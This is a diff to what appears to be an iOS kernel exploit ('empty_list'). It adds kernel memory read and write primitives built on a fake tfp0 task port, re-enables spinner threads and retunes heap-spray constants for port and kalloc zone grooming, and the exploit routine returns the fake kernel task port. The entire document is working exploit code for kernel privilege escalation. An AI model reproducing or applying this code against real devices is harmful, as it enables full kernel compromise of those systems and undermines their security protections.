@@ -16,6 +16,26 @@
 #include "offsets.h"
 #include "kmem.h"
 
+kern_return_t mach_vm_read(
+                           vm_map_t target_task,
+                           mach_vm_address_t address,
+                           mach_vm_size_t size,
+                           vm_offset_t *data,
+                           mach_msg_type_number_t *dataCnt);
+
+kern_return_t mach_vm_write(
+                            vm_map_t target_task,
+                            mach_vm_address_t address,
+                            vm_offset_t data,
+                            mach_msg_type_number_t dataCnt);
+
+kern_return_t mach_vm_read_overwrite(
+                                     vm_map_t target_task,
+                                     mach_vm_address_t address,
+                                     mach_vm_size_t size,
+                                     mach_vm_address_t data,
+                                     mach_vm_size_t *outsize);
+
 
 void increase_limits() {
     struct rlimit lim = {0};
@@ -329,27 +349,22 @@ int next_early_kalloc = 0;
 mach_port_t middle_kallocs[80000];
 int next_middle_kalloc = 0;
 
-
-// in the end I don't use these, but maybe they help?
-
 volatile int keep_spinning = 1;
 void* spinner(void* arg) {
     while(keep_spinning);
     return NULL;
 }
 
-#define N_SPINNERS 100
+#define N_SPINNERS 25
 pthread_t spin_threads[N_SPINNERS];
 
 void start_spinners() {
-    return;
     for (int i = 0; i < N_SPINNERS; i++) {
         pthread_create(&spin_threads[i], NULL, spinner, NULL);
     }
 }
 
 void stop_spinners() {
-    return;
     keep_spinning = 0;
     for (int i = 0; i < N_SPINNERS; i++) {
         pthread_join(spin_threads[i], NULL);
@@ -397,6 +412,68 @@ uint64_t early_rk64(uint64_t kaddr) {
     return final;
 }
 
+mach_port_t tfp0 = MACH_PORT_NULL;
+void prepare_for_rw_with_fake_tfp0(mach_port_t new_tfp0) {
+    tfp0 = new_tfp0;
+}
+
+void wk32(uint64_t kaddr, uint32_t val) {
+    if (tfp0 == MACH_PORT_NULL) {
+        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
+        sleep(3);
+        return;
+    }
+    
+    kern_return_t err;
+    err = mach_vm_write(tfp0,
+                        (mach_vm_address_t)kaddr,
+                        (vm_offset_t)&val,
+                        (mach_msg_type_number_t)sizeof(uint32_t));
+    
+    if (err != KERN_SUCCESS) {
+        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
+        return;
+    }
+}
+
+void wk64(uint64_t kaddr, uint64_t val) {
+    uint32_t lower = (uint32_t)(val & 0xffffffff);
+    uint32_t higher = (uint32_t)(val >> 32);
+    wk32(kaddr, lower);
+    wk32(kaddr+4, higher);
+}
+
+uint32_t rk32(uint64_t kaddr) {
+    kern_return_t err;
+    uint32_t val = 0;
+    mach_vm_size_t outsize = 0;
+    err = mach_vm_read_overwrite(tfp0,
+                                 (mach_vm_address_t)kaddr,
+                                 (mach_vm_size_t)sizeof(uint32_t),
+                                 (mach_vm_address_t)&val,
+                                 &outsize);
+    if (err != KERN_SUCCESS){
+        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
+        sleep(3);
+        return 0;
+    }
+    
+    if (outsize != sizeof(uint32_t)){
+        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
+        sleep(3);
+        return 0;
+    }
+    return val;
+}
+
+uint64_t rk64(uint64_t kaddr) {
+    uint64_t lower = rk32(kaddr);
+    uint64_t higher = rk32(kaddr+4);
+    uint64_t full = ((higher<<32) | lower);
+    return full;
+}
+
+
 mach_port_t run() {
     printf("empty_list by @i41nbeer\n");
     offsets_init();
@@ -408,12 +485,12 @@ mach_port_t run() {
     size_t kernel_page_size = 0;
     host_page_size(mach_host_self(), &kernel_page_size);
     
-    struct utsname u = { 0 };
+    /*struct utsname u = { 0 };
     uname(&u);
     if (strstr(u.machine, "iPad5,") == u.machine) {
-        kernel_page_size = 0x1000; // idk if this is required but I know for a fact iPad Air 2/Mini 4 does NOT use 16K pages. This caused yalu not to work properly before beta 7
+        kernel_page_size = 0x1000; // this is 4k but host_page_size lies to us
     }
-    
+    */
     if (kernel_page_size == 0x4000) {
         printf("this device uses 16k kernel pages\n");
     } else if (kernel_page_size == 0x1000) {
@@ -451,7 +528,7 @@ mach_port_t run() {
     
     
     int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
-    int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0xe0;  // 0x3000 with small kernel pages, 0x4000 with large
+    int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61;  // 0x3000 with small kernel pages, 0x4000 with large
     
     for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
         // 1 page of kalloc
@@ -1067,3 +1144,6 @@ mach_port_t run() {
     
     return fake_tfp0;
 }
+
+
+
